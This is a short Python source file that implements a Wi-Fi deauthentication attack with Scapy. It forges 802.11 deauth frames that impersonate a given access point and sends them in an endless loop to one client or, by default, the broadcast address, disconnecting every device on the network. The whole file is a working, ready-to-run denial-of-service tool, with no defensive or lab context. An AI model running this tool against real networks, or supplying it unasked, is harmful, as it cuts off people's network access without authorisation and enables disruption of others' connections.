#!/usr/env/bin python
from scapy.all import *
import argparse
import sys
import time


# DeauthAttack parameters
def get_arg():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="interface", help="Specify the interface to be used.")
    parse.add_argument("-a", "--access_point", dest="access_point", help="Specify the MAC of the access point.")
    parse.add_argument("-t", "--target", dest="target_mac", help="Specify the MAC of the target.",
                       default="FF:FF:FF:FF:FF:FF")
    arguments = parse.parse_args()
    return arguments


class DeauthAttack:
    def __init__(self, interface, target_mac, access_point):
        self.interface = interface
        # Verify if the target mac was specified, if not then it will be the broadcast address
        self.target_mac = target_mac
        self.access_point = access_point

    # Start the arp attack
    def start(self):
        # Start the script.
        print(f"[*] Starting Deauth Attack on {self.target_mac}")
        # addr1 is the destination (broadcast if not specified, so everyone on the network will be disconnect)
        # addr2 is the transmitter (the mac address of the AP)
        # addr3 is the sender (also the mac address of the AP)
        pkt = RadioTap() / Dot11(addr1=self.target_mac, addr2=self.access_point,
                                 addr3=self.access_point) / Dot11Deauth()
        while True:
            try:
                print("[+] Sending Deauth Frames ...")
                sendp(pkt, iface=self.interface, verbose=False)
            except (KeyboardInterrupt, SystemExit):
                self.stop()

    def stop(self):
        print("[!] Stopped Deauth Attack ...")
        sys.exit()


def main():
    options = get_arg()
    deauth = DeauthAttack(options.interface, options.target_mac, options.access_point)
    deauth.start()


if __name__ == '__main__':
    main()

